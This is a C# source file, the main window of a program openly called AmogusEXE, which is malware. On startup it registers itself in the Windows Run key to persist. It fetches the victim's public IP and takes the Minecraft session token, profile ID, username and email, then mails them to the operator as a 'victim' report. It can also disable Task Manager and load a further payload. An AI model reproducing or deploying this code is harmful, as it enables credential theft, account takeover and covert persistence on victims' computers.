using System;
using System.Collections.Generic;
using System.Windows;
using AmogusEXE.Malware.Sender;
using AmogusEXE.Malware.Encoding;
using AmogusEXE.Malware.Reader;
using AmogusEXE.Malware.Custom;
using AmogusEXE.Malware.Minecraft;
using System.IO;
using System.Net;
using AmogusEXE.Malware.Blatant;
using Microsoft.Win32;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace AmogusEXE
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            Autoload();
            GetNecessaryStuff();
            if (IsBlatant())
            {
                Functions.Blatant.DisableTaskManager();
            }
            else if (!IsBlatant())
            {
                if (!string.IsNullOrEmpty(GetNonBlatantMessage()))
                {
                    Functions.NonBlatant.Message(GetNonBlatantMessage());  
                } 
            }
            InitializeComponent();
            new ForeverWindow();
            Close();
            Payload pl = new Payload();
            pl.Load();
        }

        public static void GetNecessaryStuff()
        {
            var request = WebRequest.Create("http://checkip.dyndns.org");
            request.Method = "GET";
            using var webResponse = request.GetResponse();
            using var webStream = webResponse.GetResponseStream();
            using var reader = new StreamReader(webStream);
            string data = reader.ReadToEnd();
            string[] response = data.Split(':');
            string ip = response[1].Replace("</body></html>\r\n", "").Replace(" ", "");
            SortedDictionary<string, string> dict = ProcessSpoofer.GetMinecraft();
            string token = "<minecraft not found>";
            string profileID = "<minecraft not found>";
            string email = "<not found>";
            string minecraftName = "<minecraft not found>";
            if (dict != null)
            {
                token = dict["token"];
                profileID = dict["profileID"];
                email = dict["email"];
                minecraftName = dict["name"];
            }
            Sender.Mail(
                 $"\"AmogusEXE was initialized on victim's PC!\nUser's IPv4 Address: {ip}" +
                        $"\nUser's DNS Name: {Dns.GetHostName()}\n" +
                        $"Latest Minecraft session ID token: {token}\n" +
                        $"Minecraft profile UUID: {profileID}\n" +
                        $"Minecraft possible username: {minecraftName}\n" +
                        $"Possible victim's email: {email}" +
                        "\n \nIf you provided any external payload code, it will be executed now.\"");
        }

        public static void Autoload()
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey
                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rk.SetValue("amogus.exe", $"{Directory.GetCurrentDirectory()}\\AmogusEXE.exe");
        }

        public static bool IsBlatant()
        {
            string b64 = File.ReadAllText($"{Directory.GetCurrentDirectory()}\\data.enc");
            Base64 b = new Base64(b64, Base64Encoder.Decode);
            string j = b.OperatedData;
            JObject json = JsonConvert.DeserializeObject<JObject>(j);
            return (bool) json["blatant"];
        }

        public static string GetNonBlatantMessage()
        {
            string b64 = File.ReadAllText($"{Directory.GetCurrentDirectory()}\\data.enc");
            Base64 b = new Base64(b64, Base64Encoder.Decode);
            string j = b.OperatedData;
            JObject json = JsonConvert.DeserializeObject<JObject>(j);
            return (string) json["hideMessage"];
        }
    }
}